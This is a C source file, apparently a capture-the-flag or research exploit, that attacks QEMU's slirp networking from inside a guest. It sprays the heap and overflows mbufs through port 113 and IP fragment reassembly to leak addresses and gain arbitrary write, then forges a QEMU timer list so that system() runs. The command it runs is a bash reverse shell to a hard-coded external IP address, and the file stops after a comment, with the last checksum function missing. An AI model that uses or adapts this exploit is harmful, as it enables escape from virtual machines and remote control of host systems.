#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h> // close()
#include <assert.h>
#include <string.h> // strcpy, memset(), and memcpy()

#include <netdb.h>      // struct addrinfo
#include <sys/types.h>  // needed for socket(), uint8_t, uint16_t, uint32_t
#include <sys/socket.h> // needed for socket()
#include <netinet/in.h> // IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN
#include <netinet/ip.h> // struct ip and IP_MAXPACKET (which is 65535)
#include <netinet/ip_icmp.h> // struct icmp, ICMP_ECHO
#define __FAVOR_BSD          // Use BSD format of tcp header
#include <netinet/tcp.h>     // struct tcphdr
#include <arpa/inet.h>       // inet_pton() and inet_ntop()
#include <sys/ioctl.h>       // macro ioctl is defined
#include <bits/ioctls.h>     // defines values for argument "request" of ioctl.
#include <net/if.h>          // struct ifreq
#include <linux/if_ether.h>  // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD
#include <linux/if_packet.h> // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>
#include <sys/time.h> // gettimeofday()

#include <errno.h> // errno, perror()

// Define some constants.
#define ETH_HDRLEN 14 // Ethernet header length
#define IP4_HDRLEN 20 // IPv4 header length
#define TCP_HDRLEN 20 // TCP header length, excludes options data
#define ICMP_HDRLEN 8 // ICMP header length for echo request, excludes data

#define DEBUG

#ifdef DEBUG
#define dbg_printf(fmt, ...)                                                   \
    do {                                                                       \
        fprintf(stderr, "%s:%d(): " fmt, __func__, __LINE__, ##__VA_ARGS__);   \
    } while (0)
#else
#define dbg_printf(fmt, ...)                                                   \
    do {                                                                       \
    } while (0)
#endif

typedef void *Slirp;
struct socket {};
struct mbuf {
    /* XXX should union some of these! */
    /* header at beginning of each mbuf: */
    struct mbuf *m_next; /* Linked list of mbufs */
    struct mbuf *m_prev;
    struct mbuf *m_nextpkt; /* Next packet in queue/record */
    struct mbuf *m_prevpkt; /* Flags aren't used in the output queue */
    int m_flags;            /* Misc flags */
    int m_size;             /* Size of mbuf, from m_dat or m_ext */
    struct socket *m_so;
    caddr_t m_data; /* Current location of data */
    int m_len;      /* Amount of data in this mbuf, from m_data */
    Slirp *slirp;
    bool resolution_requested;
    uint64_t expiration_date;
    char *m_ext;
    /* start of dynamic buffer area, must be last element */
    char m_dat[];
};

// some header info to pass to the send_ip_pkt
struct ip_pkt_info {
    uint16_t ip_id;
    uint16_t ip_off;
    bool MF;
    uint8_t ip_p;
};

// Function prototypes
uint16_t checksum(uint16_t *, int);
uint16_t icmp4_checksum(struct icmp, uint8_t *, int);
uint16_t tcp4_checksum(struct ip, struct tcphdr, uint8_t *, int);
char *allocate_strmem(int);
uint8_t *allocate_ustrmem(int);
int *allocate_intmem(int);
void spray(int, uint16_t);
void send_ip_pkt(struct ip_pkt_info *, uint8_t *, int);
void leak(uint64_t, int);
int send_raw_pkt();
int arbitrary_write(uint64_t, int, uint8_t *, int, int);
void hexdump(const char *, void *, int);

uint64_t text_base, heap_base;
uint16_t g_spray_ip_id;
int stop_flag;

int main() {
    const char eth_frame[] =
        "\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00";
    struct icmp *icmphdr;
    struct ip *iphdr;
    uint8_t buf[IP_MAXPACKET];
    char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
    int status;

    puts("game start");
    memcpy(buf, eth_frame, ETH_HDRLEN);
    iphdr = (struct ip *)(buf + ETH_HDRLEN);
    strcpy(src_ip, "10.0.2.15");
    strcpy(dst_ip, "10.0.2.2");
    iphdr->ip_hl = IP4_HDRLEN / sizeof(uint32_t);
    iphdr->ip_v = 4;
    iphdr->ip_tos = 0;
    // 这里不需要htons，因为在ip_input里会转换一遍
    iphdr->ip_len = (ICMP_HDRLEN);
    iphdr->ip_id = (0xcdcd);
    // Zero (1 bit)
    // Do not fragment flag (1 bit)
    // More fragments following flag (1 bit)
    // Fragmentation offset (13 bits)
    iphdr->ip_off = ((0 << 15) + (0 << 14) + (0 << 13) + (0 >> 3));
    iphdr->ip_ttl = 255;
    iphdr->ip_p = IPPROTO_ICMP;
    if ((status = inet_pton(AF_INET, src_ip, &(iphdr->ip_src))) != 1 ||
        (status = inet_pton(AF_INET, dst_ip, &(iphdr->ip_dst))) != 1) {
        dbg_printf("inet_pton() failed.\nError message: %s", strerror(status));
        exit(EXIT_FAILURE);
    }
    iphdr->ip_sum = 0;
    iphdr->ip_sum = checksum((uint16_t *)&iphdr, IP4_HDRLEN);

    icmphdr = (struct icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);
    icmphdr->icmp_type = ICMP_ECHO;
    // Message Code (8 bits): echo request
    icmphdr->icmp_code = 0;
    // Identifier (16 bits): usually pid of sending process - pick a number
    icmphdr->icmp_id = htons(1000);
    // Sequence Number (16 bits): starts at 0
    icmphdr->icmp_seq = htons(0);
    // ICMP header checksum (16 bits): set to 0 when calculating checksum
    // TBD
    // icmphdr->icmp_cksum = icmp4_checksum(icmphdr, data, datalen);
    icmphdr->icmp_cksum = icmp4_checksum(*icmphdr, buf, 0);
    const char exec_cmd[] =
        "/bin/bash -c 'bash -i >& /dev/tcp/60.205.202.176/31337 0>&1'";
    // const char exec_cmd[] = "DISPLAY=:0 /usr/bin/snap run gnome-calculator";
    memcpy(buf + ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN, exec_cmd,
           strlen(exec_cmd) + 1);
    g_spray_ip_id = 0xaabb;
    arbitrary_write(
        0x0b00, 3, buf,
        ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN + strlen(exec_cmd) + 1, 0x250);
    g_spray_ip_id = 0xbbaa;
    leak(0x0b00 + 0x318 + 0x14 + ETH_HDRLEN,
         3); // reass处理完后会把m_data减掉ip头的长度
    dbg_printf("after leak");

    // fake timer_list
    /* gdb-peda$ p *timer_list
    $45 = {
        clock = 0x55a8d1473380 <qemu_clocks>,
        active_timers_lock = {
            lock = pthread_mutex_t = {
            Type = Normal,
            Status = Not acquired,
            Robust = No,
            Shared = No,
            Protocol = None
            },
            file = 0x0,
            line = 0x0,
            initialized = 0x1
        },
        active_timers = 0x55a8d3641df0,
        list = {
            le_next = 0x0,
            le_prev = 0x55a8d2594cb8
        },
        notify_cb = 0x55a8d076c793 <qemu_timer_notify_cb>,
        notify_opaque = 0x0,
        timers_done_ev = {
            value = 0x0,
            initialized = 0x1
        }
    } */
    uint64_t fake_timer_list = heap_base + 0x1000;
    *(uint64_t *)buf = text_base + 0x100fba0; // qemu_clocks
    memset(buf + 8, 0, 8 * 6);
    *(uint64_t *)(buf + 0x38) = 0x0000000100000000;
    *(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers
    *(uint64_t *)(buf + 0x48) = 0;
    *(uint64_t *)(buf + 0x50) = 0;
    *(uint64_t *)(buf + 0x58) = text_base + 0x2d4904; // qemu_timer_notify_cb
    *(uint64_t *)(buf + 0x60) = 0;
    *(uint64_t *)(buf + 0x68) = 0x0000000100000000;
    // end of timer_list
    // start of active_timers
    /* gdb-peda$ p *timer_list->active_timers
    $49 = {
        expire_time = 0x22823f5aad00,
        timer_list = 0x55a8d2594840,
        cb = 0x55a8d0b66a82 <gui_update>,
        opaque = 0x55a8d3ae6e50,
        next = 0x55a8d3ae6e80,
        attributes = 0x0,
        scale = 0xf4240
    } */
    *(uint64_t *)(buf + 0x70) = 0; // expire_time set to 0 will trigger func cb
    *(uint64_t *)(buf + 0x78) = fake_timer_list;
    *(uint64_t *)(buf + 0x80) = text_base + 0x281ce0;    // system
    *(uint64_t *)(buf + 0x88) = heap_base + 0xe38 + 0xa; // cmd的地址
    *(uint64_t *)(buf + 0x90) = 0;
    *(uint64_t *)(buf + 0x98) = 0x000f424000000000;
    g_spray_ip_id = 0xccbb;
    arbitrary_write(fake_timer_list - 0x318, 8, buf, 0xa0, 0x20);

    stop_flag = 1;
    // dbg_printf("check heap here");
    // qemu timer
    // 改掉全局的main_loop_tlg
    *(uint64_t *)buf = fake_timer_list; // qemu_clocks
    g_spray_ip_id = 0xddbb;
    arbitrary_write(text_base + 0x100fb80 - 0x318, 8, buf, 8, 0x20);
    return 0;
}

void leak(uint64_t addr, int addr_len) {
    int s, len, i, recvsd;
    struct sockaddr_in ip_addr;
    int ret;
    struct ip_pkt_info pkt_info;

    uint8_t *payload = (uint8_t *)malloc(IP_MAXPACKET);
    uint8_t *payload_start = payload;
    uint32_t *payload32 = (uint32_t *)payload;
    uint64_t *payload64 = (uint64_t *)payload;

    memset(payload, 'A', 0x1000);

    dbg_printf("in leak_text...\n");
    for (i = 0; i < 0x20; ++i) {
        dbg_printf("spraying size 0x2000, id: %d\n", i);
        spray(0x2000, g_spray_ip_id + i);
    }
    dbg_printf("spray finished.\n");
    // getchar();

    s = socket(AF_INET, SOCK_STREAM, 0);
    ip_addr.sin_family = AF_INET;
    ip_addr.sin_addr.s_addr = inet_addr("60.205.202.176");
    ip_addr.sin_port = htons(113); // vulnerable port
    len = sizeof(struct sockaddr_in);
    ret = connect(s, (struct sockaddr *)&ip_addr, len);
    if (ret == -1) {
        perror("0ops: client");
        exit(1);
    }

    pkt_info.ip_id = 0xdead;
    pkt_info.ip_off = 0;
    pkt_info.MF = 1;
    pkt_info.ip_p = IPPROTO_ICMP;
    send_ip_pkt(&pkt_info, payload, 0x300 + 4); // 这个packet就在so_rcv的后面

    /*
        let's overflow here!
        send(xxx)
    */
    for (i = 0; i < 6; ++i) {
        write(s, payload, 0x500); // 不能send一个满的m_buf，因为会有一个off by
                                  // null = =。。。。
        usleep(20000); // 不知道为啥，貌似内核会合并包？
                       // 如果合并了就会off by null...
                       // 所以sleep一下
        dbg_printf("send %d complete\n", i + 1);
    }
    write(s, payload, 1072);
    // actual overflow here
    *payload64++ = 0;
    *payload64++ = 0x675; // chunk header
    *payload64++ = 0;     // m_next
    *payload64++ = 0;     // m_prev
    *payload64++ = 0;     // m_nextpkt
    *payload64++ = 0;     // m_prevpkt
    payload32 = (uint32_t *)payload64;
    *payload32++ = 0;     // m_flags
    *payload32++ = 0x608; // m_size
    payload64 = (uint64_t *)payload32;
    *payload64++ = 0; // m_so
    payload = (uint8_t *)payload64;
    assert(addr_len <= 8);
    for (i = 0; i < addr_len; ++i) {
        *payload++ = (addr >> (i * 8)) & 0xff; // m_data
    }
    write(s, payload_start, (uint8_t *)payload - payload_start);
    // write(s, payload, 0x1000);
    dbg_printf("trigger reass!");
    // getchar();
    memset(payload, 'A', 0x1000);
    pkt_info.ip_id = 0xdead;
    pkt_info.ip_off = 0x300 + 24;
    pkt_info.MF = 0;
    pkt_info.ip_p = IPPROTO_ICMP;

    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    send_ip_pkt(&pkt_info, payload, 0);

    // we receive data here
    int bytes, status;
    struct ip *recv_iphdr;
    struct icmp *recv_icmphdr;
    uint8_t recv_ether_frame[IP_MAXPACKET];
    struct sockaddr from;
    socklen_t fromlen;
    struct timeval wait, t1, t2;
    struct timezone tz;
    double dt;

    (void)gettimeofday(&t1, &tz);
    wait.tv_sec = 2;
    wait.tv_usec = 0;
    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (char *)&wait,
               sizeof(struct timeval));
    recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN);
    recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);
    int count = 0;
    while (1) {
        memset(recv_ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
        memset(&from, 0, sizeof(from));
        fromlen = sizeof(from);
        if ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, 0,
                              (struct sockaddr *)&from, &fromlen)) < 0) {
            status = errno;
            if (status == EAGAIN) { // EAGAIN = 11
                dbg_printf("No reply within %li seconds.\n", wait.tv_sec);
                exit(EXIT_FAILURE);
            } else if (status == EINTR) { // EINTR = 4
                continue;
            } else {
                perror("recvfrom() failed ");
                exit(EXIT_FAILURE);
            }
        } // End of error handling conditionals.
        // hexdump("recv", recv_ether_frame, 0x50);
        dbg_printf("recv count %d\n", count++);
        if ((((recv_ether_frame[12] << 8) + recv_ether_frame[13]) ==
             ETH_P_IP) &&
            (recv_iphdr->ip_p == IPPROTO_ICMP) &&
            (recv_icmphdr->icmp_type == ICMP_ECHOREPLY)) {
            // Stop timer and calculate how long it took to get a reply.
            (void)gettimeofday(&t2, &tz);
            dt = (double)(t2.tv_sec - t1.tv_sec) * 1000.0 +
                 (double)(t2.tv_usec - t1.tv_usec) / 1000.0;
            // 底下这个可能会segfault
            // if (inet_ntop(AF_INET, &(recv_iphdr->ip_src.s_addr), rec_ip,
            // INET_ADDRSTRLEN) == NULL) {
            //     status = errno;
            //     fprintf(stderr, "inet_ntop() failed.\nError message: %s",
            //     strerror(status)); exit(EXIT_FAILURE);
            // }
            dbg_printf("%g ms (%i bytes received)\n", dt, bytes);
#ifdef DEBUG
            hexdump("ping recv", recv_ether_frame, bytes);
#endif
            if (bytes < 0x200)
                continue;
            text_base =
                ((*(uint64_t *)(recv_ether_frame + 0x88)) - 0x789000) & ~0xfff;
            heap_base = (*(uint64_t *)(recv_ether_frame + 0x90)) & ~0xffffff;
            dbg_printf("leak text_base: 0x%lx\n"
                       "leak heap_base: 0x%lx\n",
                       text_base, heap_base);
            // getchar();
            break;
        } // End if IP ethernet frame carrying ICMP_ECHOREPLY
    }

    close(s);
    close(recvsd);
    free(payload_start);
}

int arbitrary_write(uint64_t addr, int addr_len, uint8_t *write_data,
                    int write_data_len, int spray_times) {
    int s, len, i;
    struct sockaddr_in ip_addr;
    int ret;
    struct ip_pkt_info pkt_info;

    uint8_t *payload = (uint8_t *)malloc(IP_MAXPACKET);
    uint8_t *payload_start = payload;
    uint32_t *payload32 = (uint32_t *)payload;
    uint64_t *payload64 = (uint64_t *)payload;

    memset(payload, 'A', 0x1000);

    for (i = 0; i < spray_times; ++i) {
        dbg_printf("spraying size 0x2000, id: %d\n", i);
        spray(0x2000, g_spray_ip_id + i);
    }
    dbg_printf("spray finished.\n");

    s = socket(AF_INET, SOCK_STREAM, 0);
    ip_addr.sin_family = AF_INET;
    ip_addr.sin_addr.s_addr = inet_addr("60.205.202.176");
    ip_addr.sin_port = htons(113); // vulnerable port
    len = sizeof(struct sockaddr_in);
    ret = connect(s, (struct sockaddr *)&ip_addr, len);
    if (ret == -1) {
        perror("oops: client");
        exit(1);
    }
    pkt_info.ip_id = 0xdead;
    pkt_info.ip_off = 0;
    pkt_info.MF = 1;
    pkt_info.ip_p = 0xff;
    send_ip_pkt(&pkt_info, payload, 0x300 + 4); // 这个packet就在so_rcv的后面

    /*
        let's overflow here!
        send(xxx)
    */
    for (i = 0; i < 6; ++i) {
        write(s, payload, 0x500); // 不能send一个满的m_buf，因为会有一个off by
                                  // null = =。。。。
        usleep(20000); // 不知道为啥，貌似内核会合并包？
                       // 如果合并了就会off by null...
                       // 所以sleep一下
        dbg_printf("send %d complete\n", i + 1);
    }
    write(s, payload, 1072);
    // actual overflow here
    *payload64++ = 0;
    *payload64++ = 0x675; // chunk header
    *payload64++ = 0;     // m_next
    *payload64++ = 0;     // m_prev
    *payload64++ = 0;     // m_nextpkt
    *payload64++ = 0;     // m_prevpkt
    payload32 = (uint32_t *)payload64;
    *payload32++ = 0;     // m_flags
    *payload32++ = 0x608; // m_size
    payload64 = (uint64_t *)payload32;
    *payload64++ = 0; // m_so
    payload = (uint8_t *)payload64;
    assert(addr_len <= 8);
    for (i = 0; i < addr_len; ++i) {
        *payload++ = (addr >> (i * 8)) & 0xff; // m_data
    }
    write(s, payload_start, (uint8_t *)payload - payload_start);
    // write(s, payload, 0x1000);
    if (stop_flag) {
        puts("trigger!");
        getchar();
    }
    pkt_info.ip_id = 0xdead;
    pkt_info.ip_off = 0x300 + 24;
    pkt_info.MF = 0;
    pkt_info.ip_p = 0xff;
    send_ip_pkt(&pkt_info, write_data, write_data_len);

    close(s);
    free(payload_start);
    return 0;
}

// 真正malloc的大小是payloadlen + 64
void send_ip_pkt(struct ip_pkt_info *pkt_info, uint8_t *payload,
                 int payloadlen) {
    int status, sd, *ip_flags, *tcp_flags;
    const int on = 1;
    char *interface, *src_ip, *dst_ip;
    struct ip iphdr;
    uint8_t *packet;
    struct sockaddr_in sin;
    struct ifreq ifr;

    // Allocate memory for various arrays.
    packet = allocate_ustrmem(IP_MAXPACKET);
    interface = allocate_strmem(40);
    src_ip = allocate_strmem(INET_ADDRSTRLEN);
    dst_ip = allocate_strmem(INET_ADDRSTRLEN);
    ip_flags = allocate_intmem(4);
    tcp_flags = allocate_intmem(8);

    // Interface to send packet through.
    strcpy(interface, "ens2");

    // Submit request for a socket descriptor to look up interface.
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() failed to get socket descriptor for using ioctl() ");
        exit(EXIT_FAILURE);
    }

    // Use ioctl() to look up interface index which we will use to
    // bind socket descriptor sd to specified interface with setsockopt() since
    // none of the other arguments of sendto() specify which interface to use.
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
    if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl() failed to find interface ");
        exit(EXIT_FAILURE);
    }
    close(sd);

    // Source IPv4 address: you need to fill this out
    strcpy(src_ip, "127.0.0.1");
    strcpy(dst_ip, "127.0.0.1");

    // IPv4 header
    // IPv4 header length (4 bits): Number of 32-bit words in header = 5
    iphdr.ip_hl = IP4_HDRLEN / sizeof(uint32_t);
    // Internet Protocol version (4 bits): IPv4
    iphdr.ip_v = 4;
    // Type of service (8 bits)
    iphdr.ip_tos = 0;
    // Total length of datagram (16 bits): IP header + TCP header + TCP data
    iphdr.ip_len = htons(IP4_HDRLEN + payloadlen);
    // ID sequence number (16 bits): unused, since single datagram
    iphdr.ip_id = htons(pkt_info->ip_id);
    // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram
    // Zero (1 bit)
    ip_flags[0] = 0;
    // Do not fragment flag (1 bit)
    ip_flags[1] = 0;
    // More fragments following flag (1 bit)
    ip_flags[2] = pkt_info->MF;
    // Fragmentation offset (13 bits)
    ip_flags[3] = 0;

    iphdr.ip_off =
        htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) +
              ip_flags[3] + (pkt_info->ip_off >> 3));
    // Time-to-Live (8 bits): default to maximum value
    iphdr.ip_ttl = 255;
    // Transport layer protocol (8 bits): 6 for TCP
    iphdr.ip_p = pkt_info->ip_p;
    // iphdr.ip_p = IPPROTO_TCP;

    // Source IPv4 address (32 bits)
    if ((status = inet_pton(AF_INET, src_ip, &(iphdr.ip_src))) != 1) {
        dbg_printf("inet_pton() failed.\nError message: %s", strerror(status));
        exit(EXIT_FAILURE);
    }

    // Destination IPv4 address (32 bits)
    if ((status = inet_pton(AF_INET, dst_ip, &(iphdr.ip_dst))) != 1) {
        dbg_printf("inet_pton() failed.\nError message: %s", strerror(status));
        exit(EXIT_FAILURE);
    }

    // IPv4 header checksum (16 bits): set to 0 when calculating checksum
    iphdr.ip_sum = 0;
    iphdr.ip_sum = checksum((uint16_t *)&iphdr, IP4_HDRLEN);

    // Prepare packet.
    // First part is an IPv4 header.
    memcpy(packet, &iphdr, IP4_HDRLEN * sizeof(uint8_t));
    // Last part is upper layer protocol data.
    memcpy((packet + IP4_HDRLEN), payload, payloadlen * sizeof(uint8_t));

    // The kernel is going to prepare layer 2 information (ethernet frame
    // header) for us. For that, we need to specify a destination for the kernel
    // in order for it to decide where to send the raw datagram. We fill in a
    // struct in_addr with the desired destination IP address, and pass this
    // structure to the sendto() function.
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = iphdr.ip_dst.s_addr;

    // Submit request for a raw socket descriptor.
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() failed ");
        exit(EXIT_FAILURE);
    }

    // Set flag so socket expects us to provide IPv4 header.
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt() failed to set IP_HDRINCL ");
        exit(EXIT_FAILURE);
    }

    // Bind socket to interface index.
    if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        perror("setsockopt() failed to bind to interface ");
        exit(EXIT_FAILURE);
    }

    // Send packet.
    if (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, 0,
               (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0) {
        perror("sendto() failed ");
        exit(EXIT_FAILURE);
    }

    // Close socket descriptor.
    close(sd);
    // Free allocated memory.
    free(packet);
    free(interface);
    free(src_ip);
    free(dst_ip);
    free(ip_flags);
    free(tcp_flags);
}

void spray(int size, uint16_t ip_id) {
    int i, status, sd, *ip_flags, *tcp_flags;
    const int on = 1;
    char *interface, *src_ip, *dst_ip;
    struct ip iphdr;
    struct tcphdr tcphdr;
    char *payload;
    int payloadlen;
    uint8_t *packet;
    struct sockaddr_in sin;
    struct ifreq ifr;

    // Allocate memory for various arrays.
    packet = allocate_ustrmem(IP_MAXPACKET);
    interface = allocate_strmem(40);
    src_ip = allocate_strmem(INET_ADDRSTRLEN);
    dst_ip = allocate_strmem(INET_ADDRSTRLEN);
    ip_flags = allocate_intmem(4);
    tcp_flags = allocate_intmem(8);
    payload = allocate_strmem(IP_MAXPACKET);

    payloadlen = size - 84;

    // Interface to send packet through.
    strcpy(interface, "ens2");

    // Submit request for a socket descriptor to look up interface.
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() failed to get socket descriptor for using ioctl() ");
        exit(EXIT_FAILURE);
    }

    // Use ioctl() to look up interface index which we will use to
    // bind socket descriptor sd to specified interface with setsockopt() since
    // none of the other arguments of sendto() specify which interface to use.
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
    if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl() failed to find interface ");
        exit(EXIT_FAILURE);
    }
    close(sd);
    // dbg_printf("Index for interface %s is %i\n", interface, ifr.ifr_ifindex);

    // Source IPv4 address: you need to fill this out
    strcpy(src_ip, "127.0.0.1");
    strcpy(dst_ip, "127.0.0.1");

    // IPv4 header
    // IPv4 header length (4 bits): Number of 32-bit words in header = 5
    iphdr.ip_hl = IP4_HDRLEN / sizeof(uint32_t);
    // Internet Protocol version (4 bits): IPv4
    iphdr.ip_v = 4;
    // Type of service (8 bits)
    iphdr.ip_tos = 0;
    // Total length of datagram (16 bits): IP header + TCP header + TCP data
    iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen);
    // ID sequence number (16 bits): unused, since single datagram
    iphdr.ip_id = htons(ip_id);
    // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram
    // Zero (1 bit)
    ip_flags[0] = 0;
    // Do not fragment flag (1 bit)
    ip_flags[1] = 0;
    // More fragments following flag (1 bit)
    ip_flags[2] = 1;
    // Fragmentation offset (13 bits)
    ip_flags[3] = 0;

    iphdr.ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) +
                         (ip_flags[2] << 13) + ip_flags[3]);
    // Time-to-Live (8 bits): default to maximum value
    iphdr.ip_ttl = 255;
    // Transport layer protocol (8 bits): 6 for TCP
    iphdr.ip_p = IPPROTO_TCP;

    // Source IPv4 address (32 bits)
    if ((status = inet_pton(AF_INET, src_ip, &(iphdr.ip_src))) != 1) {
        dbg_printf("inet_pton() failed.\nError message: %s", strerror(status));
        exit(EXIT_FAILURE);
    }

    // Destination IPv4 address (32 bits)
    if ((status = inet_pton(AF_INET, dst_ip, &(iphdr.ip_dst))) != 1) {
        dbg_printf("inet_pton() failed.\nError message: %s", strerror(status));
        exit(EXIT_FAILURE);
    }

    // IPv4 header checksum (16 bits): set to 0 when calculating checksum
    iphdr.ip_sum = 0;
    iphdr.ip_sum = checksum((uint16_t *)&iphdr, IP4_HDRLEN);

    // TCP header
    // Source port number (16 bits)
    tcphdr.th_sport = htons(60);
    // Destination port number (16 bits)
    tcphdr.th_dport = htons(80);
    // Sequence number (32 bits)
    tcphdr.th_seq = htonl(0);
    // Acknowledgement number (32 bits)
    tcphdr.th_ack = htonl(0);
    // Reserved (4 bits): should be 0
    tcphdr.th_x2 = 0;
    // Data offset (4 bits): size of TCP header in 32-bit words
    tcphdr.th_off = TCP_HDRLEN / 4;

    // Flags (8 bits)
    // FIN flag (1 bit)
    tcp_flags[0] = 0;
    // SYN flag (1 bit)
    tcp_flags[1] = 0;
    // RST flag (1 bit)
    tcp_flags[2] = 0;
    // PSH flag (1 bit)
    tcp_flags[3] = 1;
    // ACK flag (1 bit)
    tcp_flags[4] = 1;
    // URG flag (1 bit)
    tcp_flags[5] = 0;
    // ECE flag (1 bit)
    tcp_flags[6] = 0;
    // CWR flag (1 bit)
    tcp_flags[7] = 0;
    tcphdr.th_flags = 0;
    for (i = 0; i < 8; i++) {
        tcphdr.th_flags += (tcp_flags[i] << i);
    }

    // Window size (16 bits)
    tcphdr.th_win = htons(65535);
    // Urgent pointer (16 bits): 0 (only valid if URG flag is set)
    tcphdr.th_urp = htons(0);
    // TCP checksum (16 bits)
    tcphdr.th_sum =
        tcp4_checksum(iphdr, tcphdr, (uint8_t *)payload, payloadlen);

    // Prepare packet.
    // First part is an IPv4 header.
    memcpy(packet, &iphdr, IP4_HDRLEN * sizeof(uint8_t));
    // Next part of packet is upper layer protocol header.
    memcpy((packet + IP4_HDRLEN), &tcphdr, TCP_HDRLEN * sizeof(uint8_t));
    // Last part is upper layer protocol data.
    memcpy((packet + IP4_HDRLEN + TCP_HDRLEN), payload,
           payloadlen * sizeof(uint8_t));

    // The kernel is going to prepare layer 2 information (ethernet frame
    // header) for us. For that, we need to specify a destination for the kernel
    // in order for it to decide where to send the raw datagram. We fill in a
    // struct in_addr with the desired destination IP address, and pass this
    // structure to the sendto() function.
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = iphdr.ip_dst.s_addr;

    // Submit request for a raw socket descriptor.
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() failed ");
        exit(EXIT_FAILURE);
    }

    // Set flag so socket expects us to provide IPv4 header.
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt() failed to set IP_HDRINCL ");
        exit(EXIT_FAILURE);
    }

    // Bind socket to interface index.
    if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        perror("setsockopt() failed to bind to interface ");
        exit(EXIT_FAILURE);
    }

    // Send packet.
    if (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, 0,
               (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0) {
        perror("sendto() failed ");
        exit(EXIT_FAILURE);
    }

    // Close socket descriptor.
    close(sd);
    // Free allocated memory.
    free(packet);
    free(interface);
    free(src_ip);
    free(dst_ip);
    free(ip_flags);
    free(tcp_flags);
    free(payload);
}

// Computing the internet checksum (RFC 1071).
// Note that the internet checksum does not preclude collisions.
uint16_t checksum(uint16_t *addr, int len) {
    int count = len;
    register uint32_t sum = 0;
    uint16_t answer = 0;

    // Sum up 2-byte values until none or only one byte left.
    while (count > 1) {
        sum += *(addr++);
        count -= 2;
    }

    // Add left-over byte, if any.
    if (count > 0) {
        sum += *(uint8_t *)addr;
    }

    // Fold 32-bit sum into 16 bits; we lose information by doing this,
    // increasing the chances of a collision.
    // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    // Checksum is one's compliment of sum.
    answer = ~sum;

    return (answer);
}

// Build IPv4 ICMP pseudo-header and call checksum function.
uint16_t icmp4_checksum(struct icmp icmphdr, uint8_t *payload, int payloadlen) {
    char buf[IP_MAXPACKET];
    char *ptr;
    int chksumlen = 0;
    int i;

    ptr = &buf[0]; // ptr points to beginning of buffer buf

    // Copy Message Type to buf (8 bits)
    memcpy(ptr, &icmphdr.icmp_type, sizeof(icmphdr.icmp_type));
    ptr += sizeof(icmphdr.icmp_type);
    chksumlen += sizeof(icmphdr.icmp_type);

    // Copy Message Code to buf (8 bits)
    memcpy(ptr, &icmphdr.icmp_code, sizeof(icmphdr.icmp_code));
    ptr += sizeof(icmphdr.icmp_code);
    chksumlen += sizeof(icmphdr.icmp_code);

    // Copy ICMP checksum to buf (16 bits)
    // Zero, since we don't know it yet
    *ptr = 0;
    ptr++;
    *ptr = 0;
    ptr++;
    chksumlen += 2;

    // Copy Identifier to buf (16 bits)
    memcpy(ptr, &icmphdr.icmp_id, sizeof(icmphdr.icmp_id));
    ptr += sizeof(icmphdr.icmp_id);
    chksumlen += sizeof(icmphdr.icmp_id);

    // Copy Sequence Number to buf (16 bits)
    memcpy(ptr, &icmphdr.icmp_seq, sizeof(icmphdr.icmp_seq));
    ptr += sizeof(icmphdr.icmp_seq);
    chksumlen += sizeof(icmphdr.icmp_seq);

    // Copy payload to buf
    memcpy(ptr, payload, payloadlen);
    ptr += payloadlen;
    chksumlen += payloadlen;

    // Pad to the next 16-bit boundary
    for (i = 0; i < payloadlen % 2; i++, ptr++) {
        *ptr = 0;
        ptr++;
        chksumlen++;
    }

    return checksum((uint16_t *)buf, chksumlen);
}

// Build IPv4 TCP pseudo-header and call checksum function.
